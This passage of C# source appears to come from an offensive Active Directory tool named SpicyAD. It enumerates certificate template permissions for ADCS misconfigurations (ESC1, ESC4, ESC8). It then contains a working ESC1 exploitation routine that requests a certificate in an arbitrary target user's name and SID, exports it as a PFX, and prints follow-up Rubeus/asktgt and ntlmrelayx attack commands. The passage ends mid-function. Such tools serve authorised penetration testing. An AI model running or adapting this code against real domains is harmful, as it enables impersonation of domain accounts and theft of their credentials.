                if (sr.Properties["pkiextendedkeyusage"].Count > 0)
                {
                    foreach (var eku in sr.Properties["pkiextendedkeyusage"])
                    {
                        // Certificate Request Agent: 1.3.6.1.4.1.311.20.2.1
                        if (eku.ToString() == "1.3.6.1.4.1.311.20.2.1")
                            return true;
                    }
                }
                return false;
            }
            catch { return false; }
        }

        
        /// Get ALL principals with enrollment permissions from ActiveDirectorySecurity
        private static List<string> GetAllEnrollmentPermissionsFromSD(ActiveDirectorySecurity adSecurity)
        {
            var permissions = new List<string>();

            if (adSecurity == null)
                return permissions;

            try
            {
                AuthorizationRuleCollection rules = adSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));

                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Deny)
                        continue;

                    SecurityIdentifier ruleSid = (SecurityIdentifier)rule.IdentityReference;
                    ActiveDirectoryRights rights = rule.ActiveDirectoryRights;

                    bool canEnroll = false;
                    string permType = "";

                    // Check for GenericAll
                    if ((rights & ActiveDirectoryRights.GenericAll) == ActiveDirectoryRights.GenericAll)
                    {
                        canEnroll = true;
                        permType = "GenericAll";
                    }

                    // Check for ExtendedRight (Enroll/AutoEnroll)
                    if ((rights & ActiveDirectoryRights.ExtendedRight) == ActiveDirectoryRights.ExtendedRight)
                    {
                        string extGuid = rule.ObjectType.ToString().ToLower();
                        if (extGuid == GUID_ENROLL.ToLower())
                        {
                            canEnroll = true;
                            permType = "Enroll";
                        }
                        else if (extGuid == GUID_AUTOENROLL.ToLower())
                        {
                            canEnroll = true;
                            permType = "AutoEnroll";
                        }
                        else if (extGuid == "00000000-0000-0000-0000-000000000000")
                        {
                            canEnroll = true;
                            permType = "AllExtendedRights";
                        }
                    }

                    if (canEnroll)
                    {
                        string sidName = ResolveSidToName(ruleSid);
                        permissions.Add($"{sidName} ({permType})");
                    }
                }
            }
            catch { }

            return permissions.Distinct().ToList();
        }

        
        /// Get enrollment permissions from low-privileged groups only (Domain Users, Authenticated Users)
        private static List<string> GetLowPrivEnrollmentPermissions(ActiveDirectorySecurity adSecurity)
        {
            var permissions = new List<string>();

            if (adSecurity == null)
                return permissions;

            try
            {
                AuthorizationRuleCollection rules = adSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));

                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Deny)
                        continue;

                    SecurityIdentifier ruleSid = (SecurityIdentifier)rule.IdentityReference;
                    string sidString = ruleSid.ToString();

                    // Only include low-privileged groups
                    if (!IsLowPrivilegedSID(sidString))
                        continue;

                    ActiveDirectoryRights rights = rule.ActiveDirectoryRights;

                    bool canEnroll = false;
                    string permType = "";

                    // Check for GenericAll
                    if ((rights & ActiveDirectoryRights.GenericAll) == ActiveDirectoryRights.GenericAll)
                    {
                        canEnroll = true;
                        permType = "GenericAll";
                    }

                    // Check for ExtendedRight (Enroll/AutoEnroll)
                    if ((rights & ActiveDirectoryRights.ExtendedRight) == ActiveDirectoryRights.ExtendedRight)
                    {
                        string extGuid = rule.ObjectType.ToString().ToLower();
                        if (extGuid == GUID_ENROLL.ToLower())
                        {
                            canEnroll = true;
                            permType = "Enroll";
                        }
                        else if (extGuid == GUID_AUTOENROLL.ToLower())
                        {
                            canEnroll = true;
                            permType = "AutoEnroll";
                        }
                        else if (extGuid == "00000000-0000-0000-0000-000000000000")
                        {
                            canEnroll = true;
                            permType = "AllExtendedRights";
                        }
                    }

                    if (canEnroll)
                    {
                        string sidName = ResolveSidToName(ruleSid);
                        permissions.Add($"{sidName} ({permType})");
                    }
                }
            }
            catch { }

            return permissions.Distinct().ToList();
        }

        
        /// Get ALL principals with write/modify permissions (ESC4) from ActiveDirectorySecurity
        /// Excludes Enterprise Admins, Domain Admins, and SYSTEM
        private static List<string> GetAllWritePermissionsFromSD(ActiveDirectorySecurity adSecurity)
        {
            var permissions = new List<string>();

            if (adSecurity == null)
                return permissions;

            try
            {
                AuthorizationRuleCollection rules = adSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));

                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Deny)
                        continue;

                    SecurityIdentifier ruleSid = (SecurityIdentifier)rule.IdentityReference;

                    // Skip built-in admin accounts - they're expected to have these permissions
                    string sidString = ruleSid.ToString();
                    if (IsPrivilegedSID(sidString))
                    {
                        continue;
                    }

                    ActiveDirectoryRights rights = rule.ActiveDirectoryRights;
                    string permType = null;

                    // GenericAll (Full Control)
                    if ((rights & ActiveDirectoryRights.GenericAll) == ActiveDirectoryRights.GenericAll)
                    {
                        permType = "GenericAll";
                    }
                    // GenericWrite
                    else if ((rights & ActiveDirectoryRights.GenericWrite) == ActiveDirectoryRights.GenericWrite)
                    {
                        permType = "GenericWrite";
                    }
                    // WriteDacl
                    else if ((rights & ActiveDirectoryRights.WriteDacl) == ActiveDirectoryRights.WriteDacl)
                    {
                        permType = "WriteDacl";
                    }
                    // WriteOwner
                    else if ((rights & ActiveDirectoryRights.WriteOwner) == ActiveDirectoryRights.WriteOwner)
                    {
                        permType = "WriteOwner";
                    }
                    // WriteProperty - any WriteProperty permission is dangerous for ESC4
                    else if ((rights & ActiveDirectoryRights.WriteProperty) == ActiveDirectoryRights.WriteProperty)
                    {
                        if (rule.ObjectType == Guid.Empty)
                        {
                            permType = "WriteAllProperties";
                        }
                        else
                        {
                            // Specific property WriteProperty - still dangerous for templates
                            permType = "WriteProperty";
                        }
                    }

                    if (permType != null)
                    {
                        string sidName = ResolveSidToName(ruleSid);
                        permissions.Add($"{sidName} ({permType})");
                    }
                }
            }
            catch { }

            return permissions.Distinct().ToList();
        }

        
        /// Get write/modify permissions from low-privileged groups only (Domain Users, Authenticated Users)
        /// Only reports permissions that are actually dangerous for ESC4 exploitation
        private static List<string> GetLowPrivWritePermissions(ActiveDirectorySecurity adSecurity)
        {
            var permissions = new List<string>();

            if (adSecurity == null)
                return permissions;

            try
            {
                AuthorizationRuleCollection rules = adSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));

                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Deny)
                        continue;

                    SecurityIdentifier ruleSid = (SecurityIdentifier)rule.IdentityReference;
                    string sidString = ruleSid.ToString();

                    // Only include low-privileged groups
                    if (!IsLowPrivilegedSID(sidString))
                        continue;

                    ActiveDirectoryRights rights = rule.ActiveDirectoryRights;
                    string permType = null;

                    // GenericAll (Full Control) - can do everything
                    if ((rights & ActiveDirectoryRights.GenericAll) == ActiveDirectoryRights.GenericAll)
                    {
                        permType = "GenericAll";
                    }
                    // GenericWrite - can write all properties
                    else if ((rights & ActiveDirectoryRights.GenericWrite) == ActiveDirectoryRights.GenericWrite)
                    {
                        permType = "GenericWrite";
                    }
                    // WriteDacl - can modify ACLs to grant more permissions
                    else if ((rights & ActiveDirectoryRights.WriteDacl) == ActiveDirectoryRights.WriteDacl)
                    {
                        permType = "WriteDacl";
                    }
                    // WriteOwner - can take ownership and then modify ACLs
                    else if ((rights & ActiveDirectoryRights.WriteOwner) == ActiveDirectoryRights.WriteOwner)
                    {
                        permType = "WriteOwner";
                    }
                    // WriteProperty - only dangerous if ALL properties or DANGEROUS properties
                    else if ((rights & ActiveDirectoryRights.WriteProperty) == ActiveDirectoryRights.WriteProperty)
                    {
                        Guid objectType = rule.ObjectType;

                        if (objectType == Guid.Empty)
                        {
                            // Can write ALL properties - definitely dangerous
                            permType = "WriteAllProperties";
                        }
                        else if (IsDangerousTemplateProperty(objectType))
                        {
                            // Can write a specific dangerous property
                            permType = $"WriteProperty:{GetDangerousPropertyName(objectType)}";
                        }
                        // else: specific property that's not dangerous for ESC4 - ignore
                    }

                    if (permType != null)
                    {
                        string sidName = ResolveSidToName(ruleSid);
                        permissions.Add($"{sidName} ({permType})");
                    }
                }
            }
            catch { }

            return permissions.Distinct().ToList();
        }

        
        /// Check if a property GUID is dangerous for ESC4 (enables template modification to ESC1)
        private static bool IsDangerousTemplateProperty(Guid propertyGuid)
        {
            return propertyGuid == GUID_MSPKI_CERT_NAME_FLAG ||
                   propertyGuid == GUID_MSPKI_ENROLLMENT_FLAG ||
                   propertyGuid == GUID_PKI_EXTENDED_KEY_USAGE ||
                   propertyGuid == GUID_MSPKI_RA_SIGNATURE ||
                   propertyGuid == GUID_MSPKI_CERT_APP_POLICY;
        }

        
        /// Get friendly name for dangerous template property
        private static string GetDangerousPropertyName(Guid propertyGuid)
        {
            if (propertyGuid == GUID_MSPKI_CERT_NAME_FLAG)
                return "msPKI-Certificate-Name-Flag";
            if (propertyGuid == GUID_MSPKI_ENROLLMENT_FLAG)
                return "msPKI-Enrollment-Flag";
            if (propertyGuid == GUID_PKI_EXTENDED_KEY_USAGE)
                return "pKIExtendedKeyUsage";
            if (propertyGuid == GUID_MSPKI_RA_SIGNATURE)
                return "msPKI-RA-Signature";
            if (propertyGuid == GUID_MSPKI_CERT_APP_POLICY)
                return "msPKI-Certificate-Application-Policy";
            return propertyGuid.ToString();
        }

        
        /// Get domain SID from current domain
        private static string GetDomainSID()
        {
            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(objectClass=domainDNS)";
                searcher.PropertiesToLoad.Add("objectSid");

                SearchResult result = searcher.FindOne();
                if (result != null && result.Properties["objectSid"].Count > 0)
                {
                    byte[] sidBytes = (byte[])result.Properties["objectSid"][0];
                    return new SecurityIdentifier(sidBytes, 0).ToString();
                }
            }
            catch { }

            return null;
        }

        
        /// Check if a SID represents a low-privileged group (Domain Users, Authenticated Users, etc.)
        private static bool IsLowPrivilegedSID(string sidString, string domainSid = null)
        {
            if (string.IsNullOrEmpty(sidString))
                return false;

            // Well-known low-privileged SIDs
            if (sidString == SID_AUTHENTICATED_USERS ||  // Authenticated Users
                sidString == SID_EVERYONE)               // Everyone
            {
                return true;
            }

            // Domain-specific low-privileged groups
            if (sidString.EndsWith(SID_DOMAIN_USERS_RID) ||      // Domain Users
                sidString.EndsWith(SID_DOMAIN_COMPUTERS_RID))    // Domain Computers
            {
                return true;
            }

            return false;
        }

        
        /// Check if a SID is a privileged administrative group
        private static bool IsPrivilegedSID(string sidString)
        {
            if (string.IsNullOrEmpty(sidString))
                return false;

            // Well-known privileged SIDs
            if (sidString == "S-1-5-18" ||                   // SYSTEM
                sidString == "S-1-5-32-544" ||              // Administrators
                sidString.EndsWith("-519") ||               // Enterprise Admins
                sidString.EndsWith("-512") ||               // Domain Admins
                sidString.EndsWith("-498") ||               // Enterprise Read-only DCs
                sidString.EndsWith("-516") ||               // Domain Controllers
                sidString.EndsWith("-521") ||               // Read-only Domain Controllers
                sidString.EndsWith("-517") ||               // Cert Publishers
                sidString.EndsWith("-518"))                 // Schema Admins
            {
                return true;
            }

            return false;
        }

        // Unused - kept for reference
        private static HashSet<SecurityIdentifier> GetLowPrivilegedSIDs(string domainSid)
        {
            var sids = new HashSet<SecurityIdentifier>();

            // Authenticated Users (S-1-5-11)
            sids.Add(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null));

            // Everyone (S-1-1-0)
            sids.Add(new SecurityIdentifier(WellKnownSidType.WorldSid, null));

            if (!string.IsNullOrEmpty(domainSid))
            {
                // Domain Users (Domain SID + 513)
                try { sids.Add(new SecurityIdentifier($"{domainSid}-513")); } catch { }

                // Domain Computers (Domain SID + 515)
                try { sids.Add(new SecurityIdentifier($"{domainSid}-515")); } catch { }
            }

            return sids;
        }

        
        /// Check if low-privileged users have enrollment rights
        private static bool CheckEnrollmentPermissions(byte[] sdBytes, HashSet<SecurityIdentifier> lowPrivSids)
        {
            if (sdBytes == null || sdBytes.Length == 0)
                return false;

            try
            {
                ActiveDirectorySecurity adSecurity = new ActiveDirectorySecurity();
                adSecurity.SetSecurityDescriptorBinaryForm(sdBytes);

                AuthorizationRuleCollection rules = adSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));

                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Deny)
                        continue;

                    SecurityIdentifier ruleSid = (SecurityIdentifier)rule.IdentityReference;

                    // Check if this applies to low-priv users
                    if (!lowPrivSids.Contains(ruleSid))
                        continue;

                    ActiveDirectoryRights rights = rule.ActiveDirectoryRights;

                    // Check for GenericAll
                    if ((rights & ActiveDirectoryRights.GenericAll) == ActiveDirectoryRights.GenericAll)
                        return true;

                    // Check for ExtendedRight (Enroll/AutoEnroll)
                    if ((rights & ActiveDirectoryRights.ExtendedRight) == ActiveDirectoryRights.ExtendedRight)
                    {
                        string extGuid = rule.ObjectType.ToString().ToLower();
                        if (extGuid == GUID_ENROLL.ToLower() ||
                            extGuid == GUID_AUTOENROLL.ToLower() ||
                            extGuid == "00000000-0000-0000-0000-000000000000")
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        
        /// Check if low-privileged users have write/modify permissions (ESC4)
        private static List<string> CheckWritePermissions(byte[] sdBytes, HashSet<SecurityIdentifier> lowPrivSids)
        {
            var permissions = new List<string>();

            if (sdBytes == null || sdBytes.Length == 0)
                return permissions;

            try
            {
                ActiveDirectorySecurity adSecurity = new ActiveDirectorySecurity();
                adSecurity.SetSecurityDescriptorBinaryForm(sdBytes);

                AuthorizationRuleCollection rules = adSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));

                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Deny)
                        continue;

                    SecurityIdentifier ruleSid = (SecurityIdentifier)rule.IdentityReference;

                    // Check if this applies to low-priv users
                    if (!lowPrivSids.Contains(ruleSid))
                        continue;

                    string sidName = ResolveSidToName(ruleSid);
                    ActiveDirectoryRights rights = rule.ActiveDirectoryRights;

                    // GenericAll
                    if ((rights & ActiveDirectoryRights.GenericAll) == ActiveDirectoryRights.GenericAll)
                    {
                        permissions.Add($"GenericAll ({sidName})");
                    }

                    // GenericWrite
                    if ((rights & ActiveDirectoryRights.GenericWrite) == ActiveDirectoryRights.GenericWrite)
                    {
                        permissions.Add($"GenericWrite ({sidName})");
                    }

                    // WriteDacl
                    if ((rights & ActiveDirectoryRights.WriteDacl) == ActiveDirectoryRights.WriteDacl)
                    {
                        permissions.Add($"WriteDacl ({sidName})");
                    }

                    // WriteOwner
                    if ((rights & ActiveDirectoryRights.WriteOwner) == ActiveDirectoryRights.WriteOwner)
                    {
                        permissions.Add($"WriteOwner ({sidName})");
                    }

                    // WriteProperty (all or specific)
                    if ((rights & ActiveDirectoryRights.WriteProperty) == ActiveDirectoryRights.WriteProperty)
                    {
                        if (rule.ObjectType == Guid.Empty)
                        {
                            permissions.Add($"WriteAllProperties ({sidName})");
                        }
                    }
                }
            }
            catch { }

            return permissions.Distinct().ToList();
        }

        
        /// Resolve SID to friendly name
        private static string ResolveSidToName(SecurityIdentifier sid)
        {
            try
            {
                return sid.Translate(typeof(NTAccount)).ToString();
            }
            catch
            {
                return sid.ToString();
            }
        }

        
        /// Check for ESC8 - Web Enrollment (HTTP endpoints for certificate enrollment)
        private static void CheckESC8WebEnrollment(string configNC)
        {
            try
            {
                // Find all CAs
                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry($"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,{configNC}");
                DirectorySearcher caSearcher = new DirectorySearcher(pkiEntry);
                caSearcher.Filter = "(objectClass=pKIEnrollmentService)";
                caSearcher.PropertiesToLoad.Add("cn");
                caSearcher.PropertiesToLoad.Add("dNSHostName");

                SearchResultCollection cas = caSearcher.FindAll();

                if (cas.Count == 0)
                {
                    Console.WriteLine("[*] No Certificate Authorities found.");
                    return;
                }

                foreach (SearchResult ca in cas)
                {
                    string caName = ca.Properties["cn"][0].ToString();
                    string dnsHostName = ca.Properties["dNSHostName"].Count > 0 ?
                        ca.Properties["dNSHostName"][0].ToString() : null;

                    if (string.IsNullOrEmpty(dnsHostName))
                        continue;

                    Console.WriteLine($"[*] Checking CA: {caName} ({dnsHostName})");

                    // Check common web enrollment endpoints
                    string[] endpoints = new string[]
                    {
                        $"http://{dnsHostName}/certsrv/",
                        $"https://{dnsHostName}/certsrv/",
                        $"http://{dnsHostName}/certsrv/certfnsh.asp",
                        $"https://{dnsHostName}/certsrv/certfnsh.asp"
                    };

                    foreach (string endpoint in endpoints)
                    {
                        bool isAccessible = CheckHttpEndpoint(endpoint);
                        if (isAccessible)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"[!] ESC8 - Web Enrollment ENABLED: {endpoint}");
                            Console.ResetColor();
                            Console.WriteLine("    NTLM relay to this endpoint can obtain certificates!");
                            Console.WriteLine("    Attack: ntlmrelayx.py -t {endpoint} --adcs --template <template>");
                        }
                        else
                        {
                            OutputHelper.Verbose($"    [-] Not accessible: {endpoint}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] Error checking ESC8: {ex.Message}");
            }
        }

        
        /// Check if HTTP endpoint is accessible
        private static bool CheckHttpEndpoint(string url)
        {
            try
            {
                var request = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
                request.Method = "HEAD";
                request.Timeout = 3000;
                request.AllowAutoRedirect = false;

                using (var response = (System.Net.HttpWebResponse)request.GetResponse())
                {
                    // 200, 401, 403 all indicate the endpoint exists
                    return true;
                }
            }
            catch (System.Net.WebException ex)
            {
                if (ex.Response != null)
                {
                    var response = (System.Net.HttpWebResponse)ex.Response;
                    // 401 Unauthorized or 403 Forbidden means endpoint exists
                    if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized ||
                        response.StatusCode == System.Net.HttpStatusCode.Forbidden)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        public static string RequestCertificateWithParams(string caName, string templateName, string targetUser, string targetUPN, bool includeSID, bool quiet = false)
        {
            if (!quiet) Console.WriteLine("[*] Request Certificate (ESC1 Exploitation)\n");
            OutputHelper.Verbose($"[*] CA: {caName}");
            OutputHelper.Verbose($"[*] Template: {templateName}");
            if (!quiet) Console.WriteLine($"[*] Target User: {targetUser}");
            OutputHelper.Verbose($"[*] Target UPN: {targetUPN}");
            OutputHelper.Verbose($"[*] Include SID: {includeSID}\n");

            try
            {
                string targetSID = null;
                if (includeSID)
                {
                    // Lookup the target user's SID
                    targetSID = GetUserSID(targetUser);
                    if (string.IsNullOrEmpty(targetSID))
                    {
                        if (!quiet) Console.WriteLine("[!] Failed to retrieve SID for user. Continuing without SID...");
                    }
                    else
                    {
                        if (!quiet) Console.WriteLine($"[+] Target User SID: {targetSID}");
                    }
                }

                // Create certificate request using COM Interop
                OutputHelper.Verbose("[*] Creating certificate request...");

                try
                {
                    // Use dynamic COM interop to access CertEnroll COM objects
                    Type certEnrollType = Type.GetTypeFromProgID("X509Enrollment.CX509PrivateKey");
                    if (certEnrollType == null)
                    {
                        Console.WriteLine("[!] CertEnroll COM objects not available. Using certreq.exe instead...");
                        RequestCertificateViaCommand(caName, templateName, targetUser, targetUPN, targetSID);
                        return null;
                    }

                    dynamic privateKey = Activator.CreateInstance(certEnrollType);
                    privateKey.ProviderName = "Microsoft RSA SChannel Cryptographic Provider";
                    privateKey.KeySpec = 1; // XCN_AT_KEYEXCHANGE
                    privateKey.Length = 2048;
                    privateKey.MachineContext = false;
                    privateKey.ExportPolicy = 1; // XCN_NCRYPT_ALLOW_EXPORT_FLAG
                    privateKey.Create();

                    // Create the certificate request
                    Type reqType = Type.GetTypeFromProgID("X509Enrollment.CX509CertificateRequestPkcs10");
                    dynamic request = Activator.CreateInstance(reqType);

                    // Initialize WITHOUT template name to avoid policy server lookup
                    // Template will be specified as enrollment attribute instead
                    request.InitializeFromPrivateKey(1, privateKey, ""); // ContextUser = 1, empty template

                    // Add certificate template as enrollment attribute
                    // This is how non-domain-joined machines specify the template
                    Type attrType = Type.GetTypeFromProgID("X509Enrollment.CX509AttributeExtensions");
                    if (attrType != null)
                    {
                        try
                        {
                            // Create CertificateTemplate extension
                            Type certTemplateType = Type.GetTypeFromProgID("X509Enrollment.CX509ExtensionTemplateName");
                            if (certTemplateType != null)
                            {
                                dynamic templateExt = Activator.CreateInstance(certTemplateType);
                                templateExt.InitializeEncode(templateName);
                                request.X509Extensions.Add(templateExt);
                                OutputHelper.Verbose($"[*] Added template extension: {templateName}");
                            }
                        }
                        catch
                        {
                            // Fallback: template will be specified in enrollment attributes
                            OutputHelper.Verbose("[*] Template will be specified via enrollment attributes");
                        }
                    }

                    // Set the subject name
                    Type dnType = Type.GetTypeFromProgID("X509Enrollment.CX500DistinguishedName");
                    dynamic subjectDN = Activator.CreateInstance(dnType);
                    subjectDN.Encode($"CN={targetUser}", 0);
                    request.Subject = subjectDN;

                    // Add SAN extension with UPN (and optionally SID for Strong Certificate Mapping)
                    Type sanType = Type.GetTypeFromProgID("X509Enrollment.CX509ExtensionAlternativeNames");
                    dynamic sanExtension = Activator.CreateInstance(sanType);

                    Type altNamesType = Type.GetTypeFromProgID("X509Enrollment.CAlternativeNames");
                    dynamic altNames = Activator.CreateInstance(altNamesType);

                    // Add UPN
                    Type altNameType = Type.GetTypeFromProgID("X509Enrollment.CAlternativeName");
                    dynamic altNameUPN = Activator.CreateInstance(altNameType);
                    altNameUPN.InitializeFromString(11, targetUPN); // XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME = 11
                    altNames.Add(altNameUPN);

                    // Add SID as URL in SAN for Strong Certificate Mapping (KB5014754)
                    // Format: tag:microsoft.com,2022-09-14:sid:<SID>
                    if (!string.IsNullOrEmpty(targetSID))
                    {
                        try
                        {
                            string sidUrl = $"tag:microsoft.com,2022-09-14:sid:{targetSID}";
                            OutputHelper.Verbose($"[*] Adding SID to SAN: {sidUrl}");

                            dynamic altNameSID = Activator.CreateInstance(altNameType);
                            altNameSID.InitializeFromString(7, sidUrl); // XCN_CERT_ALT_NAME_URL = 7
                            altNames.Add(altNameSID);
                        }
                        catch (Exception sidEx)
                        {
                            Console.WriteLine($"[!] Warning: Could not add SID URL: {sidEx.Message}");
                        }
                    }

                    sanExtension.InitializeEncode(altNames);
                    request.X509Extensions.Add(sanExtension);

                    // Encode the request
                    request.Encode();

                    // Create enrollment object
                    Type enrollType = Type.GetTypeFromProgID("X509Enrollment.CX509Enrollment");
                    dynamic enrollment = Activator.CreateInstance(enrollType);
                    enrollment.InitializeFromRequest(request);
                    enrollment.CertificateFriendlyName = $"SpicyAD_{targetUser}_{DateTime.Now:yyyyMMdd_HHmmss}";

                    // Add CertificateTemplate attribute to specify the template
                    // This is required for non-domain-joined machines
                    try
                    {
                        string templateAttr = $"CertificateTemplate:{templateName}";
                        OutputHelper.Verbose($"[*] Adding enrollment attribute: {templateAttr}");
                    }
                    catch { }

                    if (string.IsNullOrWhiteSpace(caName))
                    {
                        Console.WriteLine("[!] Error: CA name is empty. Cannot submit request.");
                        return null;
                    }

                    string certRequest = enrollment.CreateRequest(1); // XCN_CRYPT_STRING_BASE64

                    // Specify template in attributes parameter
                    string attributes = $"CertificateTemplate:{templateName}";

                    // Submit to CA using CERTCLILib
                    const int CR_IN_BASE64 = 0x1;
                    const int CR_IN_FORMATANY = 0;
                    const int CR_DISP_ISSUED_CONST = 0x3;
                    const int CR_DISP_UNDER_SUBMISSION_CONST = 0x5;
                    const int CR_OUT_BASE64 = 0x1;

                    Console.WriteLine($"[*] Submitting request to CA: {caName}...");

                    var certRequestObj = new CCertRequest();
                    int disposition = 0;
                    string certData = null;

                    // Use impersonation if alternate credentials are provided (for non-domain-joined machines)
                    IntPtr userToken = IntPtr.Zero;
                    WindowsImpersonationContext impersonationContext = null;

                    try
                    {
                        if (AuthContext.UseAlternateCredentials && !string.IsNullOrEmpty(AuthContext.Username) && !string.IsNullOrEmpty(AuthContext.Password))
                        {
                            string domain = AuthContext.CredentialDomain ?? AuthContext.DomainName;
                            OutputHelper.Verbose($"[*] Using impersonation: {domain}\\{AuthContext.Username}");

                            bool logonSuccess = LogonUser(
                                AuthContext.Username,
                                domain,
                                AuthContext.Password,
                                LOGON32_LOGON_NEW_CREDENTIALS,
                                LOGON32_PROVIDER_WINNT50,
                                out userToken);

                            if (!logonSuccess)
                            {
                                int error = Marshal.GetLastWin32Error();
                                Console.WriteLine($"[!] LogonUser failed with error: {error}");
                                Console.WriteLine("[!] Attempting without impersonation...");
                            }
                            else
                            {
                                WindowsIdentity newIdentity = new WindowsIdentity(userToken);
                                impersonationContext = newIdentity.Impersonate();
                                OutputHelper.Verbose("[+] Impersonation active");
                            }
                        }

                        disposition = certRequestObj.Submit(CR_IN_BASE64 | CR_IN_FORMATANY, certRequest, attributes, caName);

                        if (disposition == CR_DISP_ISSUED_CONST)
                        {
                            certData = certRequestObj.GetCertificate(CR_OUT_BASE64);
                        }
                    }
                    catch (System.Runtime.InteropServices.COMException comEx)
                    {
                        Console.WriteLine($"[!] COM Error connecting to CA: 0x{(uint)comEx.ErrorCode:X8}");
                        Console.WriteLine($"[!] Message: {comEx.Message}");
                        Console.WriteLine("[!] Verify CA name format: HOSTNAME\\CA-NAME (e.g., DC01\\EVILCORP-CA)");
                        return null;
                    }
                    finally
                    {
                        // Clean up impersonation
                        if (impersonationContext != null)
                        {
                            impersonationContext.Undo();
                            impersonationContext.Dispose();
                        }
                        if (userToken != IntPtr.Zero)
                        {
                            CloseHandle(userToken);
                        }
                    }

                    if (disposition == CR_DISP_UNDER_SUBMISSION_CONST)
                    {
                        Console.WriteLine("[!] Certificate request is pending approval.");
                        Console.WriteLine($"[*] Request ID: {certRequestObj.GetRequestId()}");
                        return null;
                    }
                    else if (disposition != CR_DISP_ISSUED_CONST)
                    {
                        Console.WriteLine($"[!] CA Response: {certRequestObj.GetDispositionMessage()}");
                        Console.WriteLine($"[!] Last status: 0x{(uint)certRequestObj.GetLastStatus():X}");
                        return null;
                    }

                    if (disposition == 3) // CR_DISP_ISSUED
                    {
                        Console.WriteLine("[+] Certificate issued by CA!");

                        string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                        string pfxFile = $"{targetUser}_{timestamp}.pfx";

                        // Create PFX directly without installing to store
                        OutputHelper.Verbose("[*] Creating PFX file (without installing to certificate store)...");

                        bool pfxCreated = CreatePFXWithoutInstall(certData, privateKey, pfxFile, "");

                        if (!pfxCreated)
                        {
                            // Fallback: temporarily install, export, then cleanup
                            OutputHelper.Verbose("[*] Using fallback method (temporary install)...");
                            try
                            {
                                // InstallResponse parameters:
                                // 2 = AllowNoOutstandingRequest
                                // certData = base64 encoded certificate
                                // 1 = XCN_CRYPT_STRING_BASE64
                                // null = no password
                                enrollment.InstallResponse(2, certData, 1, null);

                                // CreatePFX returns base64 encoded PFX data
                                // Parameters: password, exportOptions, encoding
                                // 0 = PFXExportChainNoRoot
                                // 1 = XCN_CRYPT_STRING_BASE64
                                string pfxDataBase64 = enrollment.CreatePFX("", 0, 1);

                                // Clean up the base64 string (remove headers if present)
                                pfxDataBase64 = pfxDataBase64.Replace("\r", "").Replace("\n", "");

                                byte[] pfxBytes = Convert.FromBase64String(pfxDataBase64);
                                File.WriteAllBytes(pfxFile, pfxBytes);
                                pfxCreated = true;

                                // Immediately cleanup from store
                                CleanupInstalledCertificate(targetUser);
                                OutputHelper.Verbose("[+] Certificate removed from store after export");
                            }
                            catch (Exception fallbackEx)
                            {
                                Console.WriteLine($"[!] Fallback method failed: {fallbackEx.Message}");

                                // Second fallback: try to export from store
                                try
                                {
                                    Console.WriteLine("[*] Attempting direct export from store...");
                                    ExportAndCleanupFromStore(targetUser, pfxFile, "");
                                    if (File.Exists(pfxFile))
                                    {
                                        pfxCreated = true;
                                    }
                                }
                                catch (Exception ex2)
                                {
                                    Console.WriteLine($"[!] Direct export also failed: {ex2.Message}");
                                }
                            }
                        }

                        // Show results
                        if (pfxCreated && File.Exists(pfxFile))
                        {
                            FileInfo fi = new FileInfo(pfxFile);
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"\n[+] SUCCESS! PFX file created: {fi.FullName}");
                            Console.ResetColor();
                            OutputHelper.Verbose($"    Size: {fi.Length} bytes");
                            OutputHelper.Verbose($"    Password: (empty)");
                            Console.WriteLine($"\n[*] Usage: SpicyAD.exe asktgt /certificate:{pfxFile} /getcredentials");
                            OutputHelper.Verbose($"    Or: Rubeus.exe asktgt /user:{targetUser} /certificate:{pfxFile} /getcredentials /show /nowrap");
                            return fi.FullName;
                        }
                        else
                        {
                            Console.WriteLine("\n[!] Failed to create PFX file");
                            return null;
                        }
                    }
                    else if (disposition == 5) // CR_DISP_UNDER_SUBMISSION
                    {
                        Console.WriteLine("[!] Certificate request is pending approval.");
                        return null;
                    }
                    else
                    {
                        Console.WriteLine($"[!] Certificate request failed. Disposition: {disposition}");
                        return null;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error creating certificate: {ex.Message}");
                    if (ex.InnerException != null)
                        Console.WriteLine($"[!] Inner: {ex.InnerException.Message}");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                return null;
            }
        }

        
        /// Build the szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) extension value
        /// Format: SEQUENCE { SEQUENCE { OID 1.3.6.1.4.1.311.25.2.1, CONTEXT[0] { OCTET STRING { SID } } } }
        private static byte[] BuildSidSecurityExtension(string sidString)
        {
            // Get binary SID
            var sid = new System.Security.Principal.SecurityIdentifier(sidString);
            byte[] sidBytes = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBytes, 0);

